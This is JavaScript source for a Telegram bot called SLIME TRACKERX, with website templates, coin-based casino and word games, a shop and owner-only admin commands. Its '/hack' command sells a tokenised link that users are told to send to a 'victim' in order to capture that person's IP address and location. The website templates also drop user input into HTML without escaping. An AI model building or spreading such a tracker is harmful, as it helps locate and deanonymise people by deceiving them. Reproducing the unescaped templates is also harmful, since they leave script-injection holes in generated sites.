<div class="container"><h2 class="section-title">💼 Our Services</h2><div class="services"><div class="service"><i class="fas fa-lightbulb"></i><h3>${data.service1 || 'Innovation'}</h3><p>${data.service1_desc || 'Cutting-edge solutions for modern challenges'}</p></div><div class="service"><i class="fas fa-chart-line"></i><h3>${data.service2 || 'Growth'}</h3><p>${data.service2_desc || 'Strategic planning for business growth'}</p></div><div class="service"><i class="fas fa-headset"></i><h3>${data.service3 || 'Support'}</h3><p>${data.service3_desc || '24/7 dedicated customer support'}</p></div></div></div>
<div class="contact-section"><h2>📞 Contact Us</h2><div class="contact-info"><div><i class="fas fa-envelope"></i><p>${data.email || 'info@example.com'}</p></div><div><i class="fas fa-phone"></i><p>${data.phone || '+1 234 567 8900'}</p></div><div><i class="fas fa-map-marker-alt"></i><p>${data.address || '123 Business Ave'}</p></div></div></div>
<footer><p><i class="fas fa-fire"></i> Built with SLIME TRACKERX | ${new Date().getFullYear()}</p></footer>
</body>
</html>`,

  store: (data) => `<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>${data.store || 'Store'} | SLIME TRACKERX</title>
<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Poppins',sans-serif;background:#f5f5f5}
.navbar{background:#fff;padding:20px 50px;display:flex;justify-content:space-between;box-shadow:0 2px 20px rgba(0,0,0,0.1);flex-wrap:wrap}
.logo{font-size:28px;font-weight:700;color:#667eea}
.cart-icon{font-size:24px;color:#333}
.hero{background:linear-gradient(135deg,#667eea,#764ba2);color:#fff;text-align:center;padding:80px 20px}
.hero h1{font-size:48px;margin-bottom:20px}
.products{max-width:1200px;margin:60px auto;padding:0 20px;display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:30px}
.product{background:#fff;border-radius:20px;padding:30px;text-align:center;box-shadow:0 5px 20px rgba(0,0,0,0.1);transition:0.3s}
.product:hover{transform:translateY(-10px)}
.product i{font-size:60px;color:#667eea;margin-bottom:20px}
.product h3{font-size:20px;margin-bottom:10px}
.price{font-size:28px;font-weight:700;color:#667eea;margin:15px 0}
.buy-btn{background:linear-gradient(45deg,#667eea,#764ba2);color:#fff;border:none;padding:12px 35px;border-radius:50px;cursor:pointer;font-weight:600;transition:0.3s}
.buy-btn:hover{transform:scale(1.05)}
footer{background:#1a1a2e;color:#fff;text-align:center;padding:40px}
@media(max-width:768px){.navbar{flex-direction:column;text-align:center;gap:15px}}
</style>
</head>
<body>
<div class="navbar"><div class="logo"><i class="fas fa-store"></i> ${data.store || 'Store'}</div><div class="cart-icon"><i class="fas fa-shopping-cart"></i></div></div>
<div class="hero"><h1>${data.store || 'Welcome to Our Store'}</h1><p>${data.tagline || 'Premium Quality Products'}</p></div>
<div class="products"><div class="product"><i class="fas fa-gem"></i><h3>${data.product1 || 'Premium Product'}</h3><div class="price">$${data.product1_price || '49'}</div><button class="buy-btn">Add to Cart</button></div><div class="product"><i class="fas fa-star"></i><h3>${data.product2 || 'Featured Item'}</h3><div class="price">$${data.product2_price || '79'}</div><button class="buy-btn">Add to Cart</button></div><div class="product"><i class="fas fa-crown"></i><h3>${data.product3 || 'Deluxe Edition'}</h3><div class="price">$${data.product3_price || '99'}</div><button class="buy-btn">Add to Cart</button></div></div>
<footer><p><i class="fas fa-envelope"></i> ${data.email || 'store@example.com'}</p><p><i class="fas fa-fire"></i> Built with SLIME TRACKERX</p></footer>
</body>
</html>`,

  restaurant: (data) => `<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>${data.restaurant || 'Restaurant'} | SLIME TRACKERX</title>
<link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@400;500;600;700;800;900&family=Poppins:wght@300;400;500;600&display=swap" rel="stylesheet">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Poppins',sans-serif;background:#fffaf5}
.header{background:linear-gradient(135deg,#8B4513,#A0522D);color:#fff;text-align:center;padding:100px 20px}
.header h1{font-family:'Playfair Display',serif;font-size:56px;margin-bottom:20px}
.header p{font-size:20px;opacity:0.9}
.menu{max-width:1000px;margin:60px auto;padding:0 20px}
.category{margin:50px 0}
.category h2{font-family:'Playfair Display',serif;color:#8B4513;border-bottom:3px solid #8B4513;padding-bottom:15px;margin-bottom:30px;font-size:32px}
.item{display:flex;justify-content:space-between;padding:20px;border-bottom:1px dashed #ddd;flex-wrap:wrap}
.item-name{font-size:18px;font-weight:500}
.item-price{color:#8B4513;font-weight:700;font-size:18px}
.specials{background:linear-gradient(135deg,#ffe4b5,#ffd699);padding:50px;border-radius:30px;text-align:center;margin:50px 0}
.info{background:#1a1a2e;color:#fff;text-align:center;padding:80px 20px}
.info h2{margin-bottom:30px}
.info p{margin:10px 0}
footer{text-align:center;padding:40px;background:#0f0f1a;color:#fff}
@media(max-width:768px){.header h1{font-size:36px}}
</style>
</head>
<body>
<div class="header"><h1><i class="fas fa-utensils"></i> ${data.restaurant || 'Restaurant'}</h1><p>${data.cuisine || 'Fine Dining Experience'}</p></div>
<div class="menu"><div class="specials"><h3><i class="fas fa-fire"></i> Today's Special</h3><p>${data.special || 'Chef\'s Special - 20% OFF on all main courses!'}</p></div>
<div class="category"><h2><i class="fas fa-seedling"></i> Appetizers</h2><div class="item"><div class="item-name">${data.app1 || 'Bruschetta'}</div><div class="item-price">$${data.app1_price || '8'}</div></div><div class="item"><div class="item-name">${data.app2 || 'Calamari'}</div><div class="item-price">$${data.app2_price || '12'}</div></div></div>
<div class="category"><h2><i class="fas fa-drumstick-bite"></i> Main Course</h2><div class="item"><div class="item-name">${data.main1 || 'Grilled Salmon'}</div><div class="item-price">$${data.main1_price || '24'}</div></div><div class="item"><div class="item-name">${data.main2 || 'Ribeye Steak'}</div><div class="item-price">$${data.main2_price || '32'}</div></div></div></div>
<div class="info"><h2><i class="fas fa-phone-alt"></i> Reserve Your Table</h2><p><i class="fas fa-map-marker-alt"></i> ${data.address || '123 Food Street'}</p><p><i class="fas fa-phone"></i> ${data.phone || '+1 234 567 8900'}</p><p><i class="fas fa-envelope"></i> ${data.email || 'info@restaurant.com'}</p></div>
<footer><p><i class="fas fa-fire"></i> Built with SLIME TRACKERX Web Creator</p></footer>
</body>
</html>`
};

// ========== WEB CREATOR ==========
bot.command("web", async (ctx) => {
  await ctx.reply("🌐 **SLIME TRACKERX WEB CREATOR** 🌐\n\nCreate stunning websites for **15 COINS**!\n\n**Templates Available:**\n🎨 portfolio - Personal portfolio\n🎮 gaming - Gaming profile\n💼 business - Business website\n🛍️ store - Online store\n🍽️ restaurant - Restaurant menu\n\n/createweb [template]\n/mywebsites");
});

bot.command("createweb", async (ctx) => {
  let args = ctx.message.text.split(" ");
  let template = args[1];
  let u = await initUser(ctx.from.id);
  
  const templates = ["portfolio", "gaming", "business", "store", "restaurant"];
  const questions = {
    portfolio: ["name", "title", "bio", "skill1", "skill2", "skill3"],
    gaming: ["gamertag", "tagline", "game1", "game2", "game3"],
    business: ["company", "tagline", "service1", "service1_desc", "service2", "service2_desc", "service3", "service3_desc", "email", "phone", "address"],
    store: ["store", "tagline", "product1", "product1_price", "product2", "product2_price", "product3", "product3_price", "email"],
    restaurant: ["restaurant", "cuisine", "special", "app1", "app1_price", "app2", "app2_price", "main1", "main1_price", "main2", "main2_price", "address", "phone", "email"]
  };
  
  if (!template || !templates.includes(template)) return ctx.reply("❌ Templates: portfolio, gaming, business, store, restaurant");
  if (u.coins < WEB_PRICE) return ctx.reply(`❌ Need ${WEB_PRICE} coins! You have ${u.coins}`);
  
  await takeCoin(ctx.from.id, WEB_PRICE);
  webBuilds.set(ctx.from.id, { template, step: 0, data: {}, questions: questions[template] });
  await ctx.reply(`✅ Selected: ${template}\n💰 -${WEB_PRICE} coins\n\n📝 Send me your ${questions[template][0]}:`);
});

bot.command("mywebsites", async (ctx) => {
  let websites = await Website.find({ ownerId: ctx.from.id });
  if (websites.length === 0) return ctx.reply("📭 No websites yet! Use /createweb");
  let message = "🌐 **YOUR WEBSITES** 🌐\n\n";
  for (let site of websites) {
    message += `• ${site.name}\n  🔗 ${site.url}\n  👁️ ${site.views} views | ❤️ ${site.likes} likes\n\n`;
  }
  await ctx.reply(message);
});

// ========== 1v1 WORD CHALLENGE ==========
bot.command("wordbattle", async (ctx) => {
  let args = ctx.message.text.split(" ");
  if (args.length < 4) {
    return ctx.reply(`📝 **1v1 WORD CHALLENGE** 📝\n\n` +
      `Usage: /wordbattle @username [amount] [difficulty]\n\n` +
      `**Difficulties:**\n` +
      `🍃 easy - 45 sec (3 letters)\n` +
      `⚡ medium - 30 sec (4 letters)\n` +
      `🔥 hard - 15 sec (5 letters)\n` +
      `💀 expert - 8 sec (6 letters)\n\n` +
      `💰 Winner takes ALL coins!`, { parse_mode: "Markdown" });
  }
  
  let targetUsername = args[1];
  let betAmount = parseInt(args[2]);
  let difficulty = args[3].toLowerCase();
  
  if (!difficultyLevels[difficulty]) return ctx.reply("❌ Invalid difficulty! Choose: easy, medium, hard, expert");
  if (isNaN(betAmount) || betAmount < WORD_MIN_BET) return ctx.reply(`❌ Minimum bet is ${WORD_MIN_BET} coins!`);
  if (betAmount > WORD_MAX_BET) return ctx.reply(`❌ Maximum bet is ${WORD_MAX_BET} coins!`);
  
  let targetId = null;
  for (let [id] of usersCache) {
    try {
      let c = await ctx.telegram.getChat(id);
      if (c.username === targetUsername.replace("@", "")) { targetId = id; break; }
    } catch(e) {}
  }
  if (!targetId) return ctx.reply("❌ User not found!");
  if (targetId === ctx.from.id) return ctx.reply("❌ Cannot battle yourself!");
  
  let user = await initUser(ctx.from.id);
  if (user.coins < betAmount) return ctx.reply(`❌ You need ${betAmount} coins!`);
  
  let diff = difficultyLevels[difficulty];
  let letterCount = diff.letters;
  let targetWord = getRandomWordByLength(letterCount);
  
  wordChallenges.set(targetId, { from: ctx.from.id, bet: betAmount, difficulty, letterCount, targetWord, status: "waiting" });
  setTimeout(() => { if (wordChallenges.get(targetId)?.status === "waiting") wordChallenges.delete(targetId); }, 60000);
  
  await ctx.reply(`✅ Challenge sent to ${targetUsername}!\n💰 Bet: ${betAmount} coins\n${diff.color} ${diff.name}\n📏 Need a ${letterCount}-letter word`);
  await ctx.telegram.sendMessage(targetId, `📝 **WORD CHALLENGE!**\n\n@${ctx.from.username || ctx.from.first_name} challenges you!\n💰 Bet: ${betAmount} coins\n📏 Need a **${letterCount}-letter word**\n\nType /acceptword to accept!`);
});

bot.command("acceptword", async (ctx) => {
  let challenge = wordChallenges.get(ctx.from.id);
  if (!challenge) return ctx.reply("❌ No challenge found!");
  if (challenge.status !== "waiting") return ctx.reply("❌ Already accepted!");
  
  let accepter = await initUser(ctx.from.id);
  if (accepter.coins < challenge.bet) return ctx.reply(`❌ Need ${challenge.bet} coins!`);
  
  await takeCoin(challenge.from, challenge.bet);
  await takeCoin(ctx.from.id, challenge.bet);
  
  let diff = difficultyLevels[challenge.difficulty];
  challenge.status = "active";
  challenge.currentTurn = "challenger";
  wordChallenges.set(ctx.from.id, challenge);
  
  await ctx.telegram.sendMessage(challenge.from, `📝 **YOUR TURN!**\n\nGive a **${challenge.letterCount}-letter word**\n⏱️ ${diff.timer} seconds!\n💰 Pot: ${challenge.bet * 2} coins`);
  
  setTimeout(async () => {
    let game = wordChallenges.get(ctx.from.id);
    if (game && game.status === "active" && game.currentTurn === "challenger") {
      game.status = "completed";
      wordChallenges.delete(ctx.from.id);
      await addCoin(ctx.from.id, challenge.bet * 2);
      let winner = await initUser(ctx.from.id);
      winner.wordWins++;
      await saveUser(ctx.from.id, winner);
      await ctx.telegram.sendMessage(ctx.from.id, `🎉 **YOU WIN!**\n💰 Won ${challenge.bet * 2} coins!`);
      await ctx.telegram.sendMessage(challenge.from, `💀 **YOU LOSE!**\n💸 Lost ${challenge.bet} coins`);
    }
  }, diff.timer * 1000);
  
  await ctx.reply(`✅ Accepted! Challenger's turn!\n⏱️ ${diff.timer} seconds!`);
});

bot.command("wordstats", async (ctx) => {
  let u = await initUser(ctx.from.id);
  await ctx.reply(`📝 **WORD BATTLE STATS**\n\n🏆 Wins: ${u.wordWins}\n💀 Losses: ${u.wordLosses}\n💰 Earned: ${u.totalEarnedFromWords} coins\n📊 Win Rate: ${u.wordWins + u.wordLosses > 0 ? Math.round((u.wordWins / (u.wordWins + u.wordLosses)) * 100) : 0}%`);
});

// ========== HACK SYSTEM ==========
bot.command("hack", async (ctx) => {
  let args = ctx.message.text.split(" ");
  let targetUsername = args[1];
  if (!targetUsername) return ctx.reply(`💀 **HACK USER**\n\nUsage: /hack @username\n💰 Cost: ${TRACK_COST} coins\n\n⚠️ Get their IP and location!`);
  
  let user = await initUser(ctx.from.id);
  if (user.coins < TRACK_COST) return ctx.reply(`❌ Need ${TRACK_COST} coins!`);
  
  let targetId = null;
  for (let [id] of usersCache) {
    try { let c = await ctx.telegram.getChat(id); if (c.username === targetUsername.replace("@", "")) { targetId = id; break; } } catch(e) {}
  }
  if (!targetId) return ctx.reply("❌ User not found!");
  
  await useHack(ctx.from.id);
  let token = crypto.randomBytes(8).toString("hex");
  tokens.set(token, { chat: ctx.chat.id, user: ctx.from.id, target: targetId });
  setTimeout(() => tokens.delete(token), 600000);
  
  await ctx.reply(`💀 **HACK INITIATED!**\n🎯 Target: ${targetUsername}\n💰 -${TRACK_COST} coins\n🔗 ${DOMAIN}?token=${token}\n\n⚠️ Send this link to the victim!`);
});

// ========== CASINO GAMES ==========
bot.command("casino", async (ctx) => {
  await ctx.reply(`🎰 **CASINO GAMES** 🎰\n\n` +
    `🎲 /blackjack [amount] - Beat the dealer\n` +
    `🎡 /roulette [amount] [red/black/odd/even]\n` +
    `🎰 /slots [amount] - Try your luck\n` +
    `🍀 /lottery buy [tickets] - Win the jackpot\n\n` +
    `💰 Minimum bets start at 5 coins!`);
});

bot.command("blackjack", async (ctx) => {
  let args = ctx.message.text.split(" ");
  let bet = parseInt(args[1]);
  let u = await initUser(ctx.from.id);
  
  if (isNaN(bet) || bet < 10) return ctx.reply("❌ Minimum bet 10 coins!");
  if (u.coins < bet) return ctx.reply(`❌ Need ${bet} coins!`);
  
  await takeCoin(ctx.from.id, bet);
  
  let playerCards = [Math.floor(Math.random() * 10) + 1, Math.floor(Math.random() * 10) + 1];
  let dealerCards = [Math.floor(Math.random() * 10) + 1, Math.floor(Math.random() * 10) + 1];
  let playerTotal = playerCards.reduce((a,b) => a+b, 0);
  let dealerTotal = dealerCards.reduce((a,b) => a+b, 0);
  
  while (dealerTotal < 17) dealerTotal += Math.floor(Math.random() * 10) + 1;
  
  let message = `🎲 **BLACKJACK**\n\nYour cards: ${playerCards.join(" + ")} = ${playerTotal}\nDealer: ${dealerCards[0]} + ?`;
  
  if (playerTotal > 21) {
    await ctx.reply(`${message}\n\n💀 BUST! You lose ${bet} coins`);
  } else if (dealerTotal > 21 || playerTotal > dealerTotal) {
    let winAmount = bet * 2;
    await addCoin(ctx.from.id, winAmount);
    u.casinoWins++;
    await saveUser(ctx.from.id, u);
    await ctx.reply(`${message}\nDealer: ${dealerCards.join(" + ")} = ${dealerTotal}\n\n🎉 WIN! +${winAmount} coins!`);
  } else {
    await ctx.reply(`${message}\nDealer: ${dealerCards.join(" + ")} = ${dealerTotal}\n\n💀 LOSE! You lose ${bet} coins`);
  }
});

bot.command("roulette", async (ctx) => {
  let args = ctx.message.text.split(" ");
  let bet = parseInt(args[1]);
  let choice = args[2]?.toLowerCase();
  let u = await initUser(ctx.from.id);
  
  if (isNaN(bet) || bet < 5) return ctx.reply("❌ Minimum bet 5 coins!");
  if (!choice || !["red", "black", "odd", "even"].includes(choice)) return ctx.reply("❌ Choose: red, black, odd, even");
  if (u.coins < bet) return ctx.reply(`❌ Need ${bet} coins!`);
  
  await takeCoin(ctx.from.id, bet);
  
  let number = Math.floor(Math.random() * 37);
  let color = number === 0 ? "green" : (number % 2 === 0 ? "black" : "red");
  let isOdd = number % 2 === 1;
  
  let win = (choice === "red" && color === "red") || (choice === "black" && color === "black") || (choice === "odd" && isOdd && number !== 0) || (choice === "even" && !isOdd && number !== 0);
  
  if (win) {
    await addCoin(ctx.from.id, bet * 2);
    u.casinoWins++;
    await saveUser(ctx.from.id, u);
    await ctx.reply(`🎡 Ball: ${number} (${color.toUpperCase()})\n🎉 WIN! +${bet * 2} coins!`);
  } else {
    await ctx.reply(`🎡 Ball: ${number} (${color.toUpperCase()})\n💀 LOSE! -${bet} coins`);
  }
});

bot.command("slots", async (ctx) => {
  let args = ctx.message.text.split(" ");
  let bet = parseInt(args[1]);
  let u = await initUser(ctx.from.id);
  
  if (isNaN(bet) || bet < 5) return ctx.reply("❌ Minimum bet 5 coins!");
  if (u.coins < bet) return ctx.reply(`❌ Need ${bet} coins!`);
  
  await takeCoin(ctx.from.id, bet);
  
  let slots = ["🍒", "🍊", "🍋", "🍉", "⭐", "💎", "7️⃣"];
  let result = [slots[Math.floor(Math.random()*7)], slots[Math.floor(Math.random()*7)], slots[Math.floor(Math.random()*7)]];
  let isJackpot = result[0] === result[1] && result[1] === result[2];
  let isTwoMatch = result[0] === result[1] || result[1] === result[2] || result[0] === result[2];
  
  if (isJackpot) {
    let win = bet * 10;
    await addCoin(ctx.from.id, win);
    u.casinoWins++;
    await saveUser(ctx.from.id, u);
    await ctx.reply(`🎰 ${result.join(" | ")} 🎰\n\n🎉🔥 JACKPOT! +${win} coins! 🔥🎉`);
  } else if (isTwoMatch) {
    let win = bet * 2;
    await addCoin(ctx.from.id, win);
    await ctx.reply(`🎰 ${result.join(" | ")} 🎰\n\n🎉 WIN! +${win} coins!`);
  } else {
    await ctx.reply(`🎰 ${result.join(" | ")} 🎰\n\n💀 LOSE! -${bet} coins`);
  }
});

// ========== LOTTERY ==========
bot.command("lottery", async (ctx) => {
  let args = ctx.message.text.split(" ");
  let action = args[1];
  
  if (action === "buy") {
    let tickets = parseInt(args[2]) || 1;
    let cost = tickets * 5;
    let u = await initUser(ctx.from.id);
    
    if (u.coins < cost) return ctx.reply(`❌ Need ${cost} coins!`);
    
    await takeCoin(ctx.from.id, cost);
    lotteryPool += cost;
    for (let i = 0; i < tickets; i++) lotteryEntries.push(ctx.from.id);
    u.lotteryTickets += tickets;
    await saveUser(ctx.from.id, u);
    
    await ctx.reply(`🎫 Bought ${tickets} ticket(s) for ${cost} coins!\n💰 Current Jackpot: ${lotteryPool} coins\n🎯 Your tickets: ${u.lotteryTickets}`);
  } else if (action === "draw" && ctx.from.id === OWNER_ID) {
    if (lotteryEntries.length === 0) return ctx.reply("No entries yet!");
    let winnerIndex = Math.floor(Math.random() * lotteryEntries.length);
    let winnerId = lotteryEntries[winnerIndex];
    let winner = await initUser(winnerId);
    await addCoin(winnerId, lotteryPool);
    await ctx.reply(`🍀 **LOTTERY DRAW** 🍀\n\n🎉 WINNER: @${winner.username || winnerId}\n💰 Won: ${lotteryPool} coins!`);
    lotteryPool = 0;
    lotteryEntries = [];
  } else {
    await ctx.reply(`🍀 **LOTTERY** 🍀\n\n/lottery buy [tickets] - 5 coins each\n💰 Current Jackpot: ${lotteryPool} coins\n👥 Total entries: ${lotteryEntries.length}`);
  }
});

// ========== TOURNAMENT ==========
bot.command("tournament", async (ctx) => {
  let args = ctx.message.text.split(" ");
  
  if (args[1] === "list") {
    let tours = Array.from(activeTournaments.values());
    if (tours.length === 0) return ctx.reply("📭 No active tournaments");
    let msg = "🏆 **ACTIVE TOURNAMENTS** 🏆\n\n";
    for (let t of tours) {
      msg += `📛 ${t.name}\n💰 Entry: ${t.entryFee} | Prize: ${t.prizePool}\n👥 Players: ${t.players.length}\n🔑 ID: ${t.id}\n\n`;
    }
    await ctx.reply(msg);
  } else if (args[1] === "join" && args[2]) {
    let tournament = activeTournaments.get(args[2]);
    if (!tournament) return ctx.reply("❌ Tournament not found!");
    if (tournament.players.includes(ctx.from.id)) return ctx.reply("❌ Already joined!");
    
    let user = await initUser(ctx.from.id);
    if (user.coins < tournament.entryFee) return ctx.reply(`❌ Need ${tournament.entryFee} coins!`);
    
    await takeCoin(ctx.from.id, tournament.entryFee);
    tournament.prizePool += tournament.entryFee;
    tournament.players.push(ctx.from.id);
    await tournament.save();
    await ctx.reply(`✅ Joined ${tournament.name}!\n💰 Prize pool: ${tournament.prizePool} coins\n👥 Players: ${tournament.players.length}`);
  } else if (args[1] === "create" && ctx.from.id === OWNER_ID) {
    let name = args[2];
    let entryFee = parseInt(args[3]);
    if (!name || isNaN(entryFee)) return ctx.reply("Usage: /tournament create [name] [fee]");
    let id = crypto.randomBytes(4).toString("hex");
    let tournament = new Tournament({ id, name, entryFee, prizePool: 0, players: [] });
    await tournament.save();
    activeTournaments.set(id, tournament);
    await ctx.reply(`✅ Tournament "${name}" created!\nID: ${id}\nEntry: ${entryFee} coins`);
  } else {
    await ctx.reply(`🏆 **TOURNAMENTS** 🏆\n\n` +
      `/tournament list - See active tournaments\n` +
      `/tournament join [id] - Join a tournament\n` +
      `/tournament create [name] [fee] - Admin only`);
  }
});

// ========== QUESTS ==========
bot.command("quests", async (ctx) => {
  let u = await initUser(ctx.from.id);
  let today = new Date().toDateString();
  
  if (!u.dailyQuests[today]) {
    u.dailyQuests[today] = { playGames: 0, winGames: 0, referrals: 0, wordWins: 0 };
    await saveUser(ctx.from.id, u);
  }
  
  let q = u.dailyQuests[today];
  await ctx.reply(`📋 **DAILY QUESTS** 📋\n\n` +
    `🎮 Play 5 games: ${q.playGames}/5\n` +
    `🏆 Win 3 games: ${q.winGames}/3\n` +
    `📝 Win 2 word battles: ${q.wordWins}/2\n` +
    `👥 Get 2 referrals: ${q.referrals}/2\n\n` +
    `🎁 Complete all for 50 COINS and a MYSTERY BOX!`);
});

// ========== SHOP ==========
bot.command("shop", async (ctx) => {
  await ctx.reply(`🛒 **SLIME TRACKERX SHOP** 🛒\n\n` +
    `💎 100 Diamonds - 50 coins\n` +
    `🎫 Lottery Ticket - 5 coins\n` +
    `🎁 Mystery Box - 20 coins\n` +
    `🔄 XP Boost (2x for 1hr) - 30 coins\n` +
    `🎨 Custom Badge - 100 coins\n\n` +
    `Use /buy [item]`);
});

bot.command("buy", async (ctx) => {
  let args = ctx.message.text.split(" ");
  let item = args[1]?.toLowerCase();
  let u = await initUser(ctx.from.id);
  
  if (item === "diamonds") {
    if (u.coins < 50) return ctx.reply("❌ Need 50 coins!");
    await takeCoin(ctx.from.id, 50);
    u.diamonds += 100;
    await saveUser(ctx.from.id, u);
    await ctx.reply(`✅ +100 diamonds! 💎`);
  } else if (item === "ticket") {
    if (u.coins < 5) return ctx.reply("❌ Need 5 coins!");
    await takeCoin(ctx.from.id, 5);
    lotteryPool += 5;
    lotteryEntries.push(ctx.from.id);
    u.lotteryTickets += 1;
    await saveUser(ctx.from.id, u);
    await ctx.reply(`✅ Bought lottery ticket!\n💰 Jackpot: ${lotteryPool}\n🎫 Your tickets: ${u.lotteryTickets}`);
  } else if (item === "mystery") {
    if (u.coins < 20) return ctx.reply("❌ Need 20 coins!");
    await takeCoin(ctx.from.id, 20);
    let rewards = [10, 20, 30, 50, 100, 200];
    let reward = rewards[Math.floor(Math.random() * rewards.length)];
    await addCoin(ctx.from.id, reward);
    let rare = reward >= 100 ? "🔥 RARE! 🔥" : "";
    await ctx.reply(`🎁 **MYSTERY BOX** 🎁\n\nYou got ${reward} coins! ${rare}`);
  } else if (item === "xboost") {
    if (u.coins < 30) return ctx.reply("❌ Need 30 coins!");
    await takeCoin(ctx.from.id, 30);
    // XP boost logic
    await ctx.reply(`✅ XP Boost activated! 2x XP for 1 hour!`);
  } else {
    await ctx.reply("❌ Items: diamonds, ticket, mystery, xboost");
  }
});

// ========== ADMIN COMMANDS ==========
bot.command("admin", async (ctx) => {
  let user = await initUser(ctx.from.id);
  if (!user.isAdmin && ctx.from.id !== OWNER_ID) return;
  await ctx.reply(`👑 **ADMIN PANEL** 👑\n\n` +
    `/addcoin @user amount\n` +
    `/gencode [coins] [diamonds] [uses]\n` +
    `/broadcast message\n` +
    `/users - Total users\n` +
    `/stats - Bot statistics\n` +
    `/banuser @user\n` +
    `/giveall amount\n` +
    `/setmenu [gif_url] - Set menu GIF\n` +
    `/removemenu - Remove menu GIF\n` +
    `/lottery draw - Draw lottery`);
});

bot.command("addcoin", async (ctx) => {
  if (ctx.from.id !== OWNER_ID) return;
  let args = ctx.message.text.split(" ");
  let user = args[1]?.replace("@", "");
  let amt = parseInt(args[2]);
  if (!user || isNaN(amt)) return;
  for (let [id, u] of usersCache) {
    try { 
      let c = await ctx.telegram.getChat(id); 
      if (c.username === user) { 
        u.coins += amt; 
        await saveUser(id, u); 
        await ctx.reply(`✅ Added ${amt} coins to @${user}\n💰 New balance: ${u.coins}`);
        return; 
      } 
    } catch(e) {}
  }
  await ctx.reply("❌ User not found!");
});

bot.command("gencode", async (ctx) => {
  if (ctx.from.id !== OWNER_ID) return;
  let args = ctx.message.text.split(" ");
  let coins = parseInt(args[1]) || 50;
  let diamonds = parseInt(args[2]) || 0;
  let uses = parseInt(args[3]) || 20;
  let code = await genCode(coins, diamonds, uses);
  await ctx.reply(`✅ **CODE GENERATED**\n\nCode: \`${code}\`\n💰 ${coins} coins${diamonds > 0 ? ` + ${diamonds}💎` : ''}\n📊 Uses: ${uses}`, { parse_mode: "Markdown" });
});

bot.command("broadcast", async (ctx) => {
  if (ctx.from.id !== OWNER_ID) return;
  let msg = ctx.message.text.split(" ").slice(1).join(" ");
  if (!msg) return ctx.reply("❌ Usage: /broadcast message");
  let sent = 0;
  let failed = 0;
  for (let [id] of usersCache) {
    try { 
      await ctx.telegram.sendMessage(id, `📢 **ANNOUNCEMENT** 📢\n\n${msg}`); 
      sent++; 
      await new Promise(r => setTimeout(r, 50));
    } catch(e) { failed++; }
  }
  await ctx.reply(`✅ Broadcast sent!\n📨 Sent: ${sent}\n❌ Failed: ${failed}`);
});

bot.command("users", async (ctx) => {
  if (ctx.from.id !== OWNER_ID) return;
  await ctx.reply(`📊 **USERS**\n\nTotal users: ${usersCache.size}\nActive today: ${Array.from(usersCache.values()).filter(u => u.lastActive && new Date() - u.lastActive < 86400000).length}`);
});

bot.command("stats", async (ctx) => {
  if (ctx.from.id !== OWNER_ID) return;
  let totalCoins = 0;
  let totalHacks = 0;
  let totalGames = 0;
  for (let u of usersCache.values()) {
    totalCoins += u.coins;
    totalHacks += u.hacks;
    totalGames += u.games;
  }
  await ctx.reply(`📊 **BOT STATISTICS** 📊\n\n` +
    `👥 Users: ${usersCache.size}\n` +
    `💰 Total Coins: ${totalCoins.toLocaleString()}\n` +
    `💀 Total Hacks: ${totalHacks}\n` +
    `🎮 Total Games: ${totalGames}\n` +
    `🏆 Tournaments: ${activeTournaments.size}`);
});

bot.command("banuser", async (ctx) => {
  if (ctx.from.id !== OWNER_ID) return;
  let args = ctx.message.text.split(" ");
  let user = args[1]?.replace("@", "");
  for (let [id] of usersCache) {
    try { 
      let c = await ctx.telegram.getChat(id); 
      if (c.username === user) { 
        bannedUsers.add(id); 
        await ctx.reply(`🚫 Banned @${user}`);
        await ctx.telegram.sendMessage(id, "🚫 You have been banned from using this bot!");
        return; 
      } 
    } catch(e) {}
  }
  await ctx.reply("❌ User not found!");
});

bot.command("giveall", async (ctx) => {
  if (ctx.from.id !== OWNER_ID) return;
  let args = ctx.message.text.split(" ");
  let amount = parseInt(args[1]);
  if (isNaN(amount)) return ctx.reply("❌ Usage: /giveall amount");
  let count = 0;
  for (let [id, u] of usersCache) { 
    u.coins += amount; 
    await saveUser(id, u); 
    count++; 
  }
  await ctx.reply(`✅ Added ${amount} coins to ${count} users`);
});

bot.command("setmenu", async (ctx) => {
  if (ctx.from.id !== OWNER_ID) return;
  let args = ctx.message.text.split(" ");
  let gifUrl = args[1];
  if (!gifUrl) return ctx.reply("❌ Usage: /setmenu [gif_url]");
  
  let user = await initUser(ctx.from.id);
  user.menuGif = gifUrl;
  await saveUser(ctx.from.id, user);
  await ctx.reply(`✅ Menu GIF set!\n${gifUrl}\n\nUse /removemenu to remove`);
});

bot.command("removemenu", async (ctx) => {
  if (ctx.from.id !== OWNER_ID) return;
  let user = await initUser(ctx.from.id);
  user.menuGif = null;
  await saveUser(ctx.from.id, user);
  await ctx.reply(`✅ Menu GIF removed!`);
});

bot.command("topcoins", async (ctx) => {
  let leaderboard = await getLeaderboard("coins", 10);
  let message = "💰 **TOP 10 RICHEST USERS** 💰\n\n";
  for (let entry of leaderboard) {
    let medal = entry.rank === 1 ? "🥇" : entry.rank === 2 ? "🥈" : entry.rank === 3 ? "🥉" : `${entry.rank}.`;
    message += `${medal} @${entry.name} - ${entry.value.toLocaleString()} coins\n`;
  }
  await ctx.reply(message, { parse_mode: "Markdown" });
});

// ========== BASIC COMMANDS ==========
bot.command("balance", async (ctx) => { 
  let u = await initUser(ctx.from.id); 
  await ctx.reply(`💰 **BALANCE** 💰\n\n🪙 Coins: ${u.coins}\n💎 Diamonds: ${u.diamonds}\n📊 Level: ${u.level}\n⭐ XP: ${u.xp}/${u.level * 100}`);
});

bot.command("profile", async (ctx) => { 
  let u = await initUser(ctx.from.id); 
  let winRate = u.games > 0 ? Math.round((u.wins / u.games) * 100) : 0;
  await ctx.reply(`👤 **${u.firstName || ctx.from.first_name}**\n\n` +
    `💰 ${u.coins} coins | 💎 ${u.diamonds}\n` +
    `📊 Level ${u.level} (${u.xp}/${u.level * 100} XP)\n` +
    `👥 ${u.referrals} referrals\n` +
